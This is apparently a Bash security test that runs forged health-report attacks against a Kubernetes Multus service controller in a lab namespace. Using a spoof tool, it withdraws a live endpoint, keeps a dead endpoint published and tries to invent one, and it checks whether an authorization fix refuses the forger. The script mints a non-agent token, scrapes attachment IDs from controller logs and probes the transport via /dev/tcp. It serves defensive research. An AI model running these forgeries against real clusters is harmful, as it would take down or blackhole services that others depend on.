#!/usr/bin/env bash
# The forged-health-report attack, run against whatever is deployed.
#
# Establishes a healthy victim endpoint the legitimate way, then, from a process
# holding no agent credential, forges health evidence for it and measures what
# the Service resolves to. Before G2 this removed/retained endpoints at will;
# after G2 the same attacker is refused at the transport. The script reports the
# numbers either way -- it is the before/after figure for the paper.
#
# ATTACKER=strong additionally hands the attacker the controller CA and a valid
# but NON-agent token, to show it is producer authorization (G2), not merely TLS
# or possessing some token, that blocks it.
set -u

NS=${NS:-ms-attack}
SVC=amf-victim
SLICE="$SVC-secondary-ipv4"
CTRL_NS=${CTRL_NS:-multus-service-system}
CTRL=${CTRL:-multus-service-controller}
NODE=${NODE:-$(hostname)}
TARGET_IP=${TARGET_IP:-10.216.0.200}
FIXTURES="$(cd "$(dirname "$0")/../test/fixtures" && pwd)"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

ok()   { printf '  \033[32m%s\033[0m %s\n' "OBSERVED" "$1"; }
bad()  { printf '  \033[31m%s\033[0m %s\n' "NOT SEEN" "$1"; }
head_(){ printf '\n\033[1m%s\033[0m\n' "$1"; }
retry(){ local d=$(( $(date +%s)+$1 )); shift; while :; do eval "$@" && return 0; [ "$(date +%s)" -ge "$d" ] && return 1; sleep 0.5; done; }
k(){ kubectl -n "$NS" "$@"; }

dns(){ k exec dnsprobe -- nslookup "$SVC.$NS.svc.cluster.local" 2>/dev/null | awk '/^Address/{print $NF}' | grep -v ':53$'; }
# fraction of a window the victim IP is present in DNS
dns_presence() {
  local secs=$1 present=0 total=0
  local end=$(( $(date +%s)+secs ))
  while [ "$(date +%s)" -lt "$end" ]; do
    total=$((total+1))
    dns | grep -q "^$VIP$" && present=$((present+1))
    sleep 0.5
  done
  echo "$present/$total"
}

cleanup(){ head_ "cleanup"; kubectl delete ns "$NS" --ignore-not-found --wait=false >/dev/null 2>&1; rm -f /tmp/spoof-ca.crt /tmp/spoof-token; "$FIXTURES/lab.sh" down >/dev/null 2>&1; }
trap cleanup EXIT

head_ "setup: healthy victim endpoint, published the legitimate way"
kubectl get ns "$NS" >/dev/null 2>&1 && { kubectl delete ns "$NS" --wait=false >/dev/null 2>&1; retry 240 '! kubectl get ns "$NS" >/dev/null 2>&1'; }
kubectl create ns "$NS" >/dev/null
"$FIXTURES/lab.sh" up-local >/dev/null

cat <<EOP | kubectl apply -f - >/dev/null
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata:
  name: sec-victim
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/probe-scope: endpoint
    secondary-service.boanlab.io/health-target: "$TARGET_IP"
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"host-local","ranges":[[{"subnet":"10.216.0.0/24","rangeStart":"10.216.0.10","rangeEnd":"10.216.0.99"}]]}}]}'
---
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata: {name: sec-victim-target, namespace: $NS}
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim-target","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"static","addresses":[{"address":"$TARGET_IP/24"}]}}]}'
---
apiVersion: v1
kind: Service
metadata:
  name: $SVC
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/network: sec-victim
    secondary-service.boanlab.io/workload-selector: app=victim
spec:
  clusterIP: None
  ports: [{name: n2, port: 8080, protocol: TCP}]
---
apiVersion: v1
kind: Pod
metadata: {name: victim, namespace: $NS, labels: {app: victim}, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: tgt, namespace: $NS, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim-target}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: dnsprobe, namespace: $NS}
spec:
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
EOP

retry 240 '[ "$(k get pod victim tgt dnsprobe --no-headers 2>/dev/null | grep -c Running)" = "3" ]' || { bad "fixtures never started"; exit 1; }
retry 120 'k get endpointslice "$SLICE" >/dev/null 2>&1'
retry 120 'k get endpointslice "$SLICE" -o jsonpath="{.endpoints[0].conditions.ready}" 2>/dev/null | grep -q true'
VIP=$(k get endpointslice "$SLICE" -o jsonpath='{.endpoints[0].addresses[0]}')

# Everything the attacker needs is derivable from cluster-visible objects.
PODUID=$(k get pod victim -o jsonpath='{.metadata.uid}')
AID=$(kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=15m 2>/dev/null \
      | grep '"event":"attachment_discovered"' | grep "\"pod_uid\":\"$PODUID\"" | tail -1 \
      | grep -o '"attachment_id":"[^"]*"' | cut -d'"' -f4)
IFACE=$(k get pod victim -o jsonpath='{.metadata.annotations.k8s\.v1\.cni\.cncf\.io/network-status}' \
        | python3 -c "import json,sys
for e in json.load(sys.stdin):
    if not e.get('default'): print(e['interface']); break")
CTRL_ADDR="$(kubectl -n "$CTRL_NS" get svc "$CTRL" -o jsonpath='{.spec.clusterIP}'):9090"
SERVER_NAME="$CTRL.$CTRL_NS.svc"
echo "  victim ip=$VIP attachment=$AID iface=$IFACE node=$NODE"
echo "  controller transport reachable at $CTRL_ADDR (server-name $SERVER_NAME)"

# Attacker credential material. A bare attacker has neither; a strong attacker
# has the CA (public) and a valid token from an ordinary Pod that is NOT an agent
# -- the closest a workload can get without being an authorized node agent.
ATTACKER=${ATTACKER:-strong}
SPOOF_TLS=(); SPOOF_TOK=()
if [ "$ATTACKER" = "strong" ]; then
  CA=/tmp/spoof-ca.crt
  kubectl -n "$CTRL_NS" get configmap controller-ca -o jsonpath='{.data.ca\.crt}' > "$CA" 2>/dev/null || true
  if [ -s "$CA" ]; then SPOOF_TLS=(--ca "$CA" --server-name "$SERVER_NAME"); echo "  attacker HAS the controller CA (it is not a secret)"; fi
  # a valid, non-agent pod-bound token for an ordinary workload on this node
  kubectl -n "$NS" create sa intruder >/dev/null 2>&1 || true
  cat <<EOP | kubectl apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: {name: intruder, namespace: $NS}
spec: {serviceAccountName: intruder, nodeName: $NODE, containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]}
EOP
  retry 120 '[ "$(k get pod intruder -o jsonpath="{.status.phase}" 2>/dev/null)" = "Running" ]' >/dev/null
  IUID=$(k get pod intruder -o jsonpath='{.metadata.uid}')
  TOKF=/tmp/spoof-token
  kubectl -n "$NS" create token intruder --bound-object-kind Pod --bound-object-name intruder --bound-object-uid "$IUID" --audience health-controller --duration 1h > "$TOKF" 2>/dev/null || true
  if [ -s "$TOKF" ]; then SPOOF_TOK=(--token "$TOKF"); echo "  attacker HAS a valid non-agent token (audience health-controller)"; fi
fi
spoof() { ( cd "$ROOT" && go run ./test/tools/spoof "${SPOOF_TLS[@]}" "${SPOOF_TOK[@]}" "$@" ); }
retry 30 'bash -c "exec 3<>/dev/tcp/${CTRL_ADDR%:*}/9090" 2>/dev/null' && ok "any workload can reach the transport; no NetworkPolicy, no credential" || bad "transport unreachable"

echo "  baseline DNS over 5s (no attacker):"
echo "    victim present: $(dns_presence 5)"

# ---------------------------------------------------------------- A1
head_ "A1  Availability: forge local_ready=false for a LIVE endpoint"
spoof --addr "$CTRL_ADDR" --node "$NODE" \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack withdraw --duration 20s > /tmp/spoof_a1.log 2>&1 &
SP=$!
sleep 3
if kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=30s 2>/dev/null \
   | grep '"event":"health_report_applied"' | grep "\"attachment_id\":\"$AID\"" | tail -1 | grep -q '"local_ready":false'; then
  bad "controller APPLIED a forged report (attack succeeded)"
else
  ok "no forged report applied for the victim attachment"
fi
if kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=30s 2>/dev/null | grep -q '"event":"stream_rejected"'; then
  ok "attacker stream rejected at the transport ($(kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=30s 2>/dev/null | grep '"event":"stream_rejected"' | tail -1 | grep -o '"reason":"[^"]*"'))"
fi
echo "  victim DNS presence over 12s WHILE attacker runs: $(dns_presence 12)"
if dns | grep -q "^$VIP$"; then
  ok "victim stayed in Service DNS throughout -- forged withdrawal had no effect"
else
  bad "victim was withdrawn (attack succeeded)"
fi
wait $SP 2>/dev/null; tail -1 /tmp/spoof_a1.log | sed 's/^/  attacker: /'
echo "  unauthorized reports accepted (must be 0): $(kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=30s 2>/dev/null | grep -c '"event":"health_report_applied".*"attachment_id":"'"$AID"'".*"local_ready":false')"

# ---------------------------------------------------------------- A2
head_ "A2  Integrity/blackhole: keep a DEAD path published"
echo "  killing the health target so the real path is genuinely down"
k delete pod tgt --wait=true >/dev/null 2>&1
retry 90 '! dns | grep -q "^$VIP$"' && ok "legitimately withdrawn once the path failed (real agent, honest)" \
  || { bad "endpoint did not withdraw on real failure"; }
echo "  now forging healthy evidence for the dead endpoint:"
spoof --addr "$CTRL_ADDR" --node "$NODE" \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack keepalive --duration 20s > /tmp/spoof_a2.log 2>&1 &
SP=$!
sleep 4
echo "  victim DNS presence over 12s WHILE attacker forges health (path is dead): $(dns_presence 12)"
if dns | grep -q "^$VIP$"; then
  bad "DEAD endpoint kept in DNS by forgery (attack succeeded)"
else
  ok "dead endpoint stayed withdrawn -- forged healthy evidence had no effect"
fi
wait $SP 2>/dev/null; tail -1 /tmp/spoof_a2.log | sed 's/^/  attacker: /'

# ---------------------------------------------------------------- G1 sanity
head_ "G1  Non-creation: forgery cannot invent an endpoint"
# Post-G2 a non-agent is refused before the app layer, so non-creation now holds
# at two layers: the transport rejects the producer, and even an authenticated
# agent's report for an unknown attachment is refused by the Registry (exercised
# in test/e2e/phase5.sh). Here we confirm the invented address never appears.
spoof --addr "$CTRL_ADDR" --node "$NODE" \
  --attachment deadbeefdeadbeef --nad "$NS/sec-victim" --interface net1 --ip 10.255.255.1 \
  --attack keepalive --duration 6s >/dev/null 2>&1 || true
sleep 2
if k get endpointslice "$SLICE" -o jsonpath='{.endpoints[*].addresses[0]}' 2>/dev/null | grep -q '10.255.255.1'; then
  bad "an invented address appeared in the slice"
else
  ok "invented address never published -- non-creation holds"
fi

head_ "summary"
echo "  A1 forged withdrawal of a live endpoint:  see presence fraction above"
echo "  A2 forged keep-alive of a dead endpoint:  see presence fraction above"
echo "  G1 non-creation:                          already enforced by the Registry"
echo
echo "  The gap both A1 and A2 exploit: the controller trusts envelope.node and"
echo "  the newest stream wins. Node identity is self-asserted, so any workload"
echo "  that can reach the transport can speak for any node's endpoints."
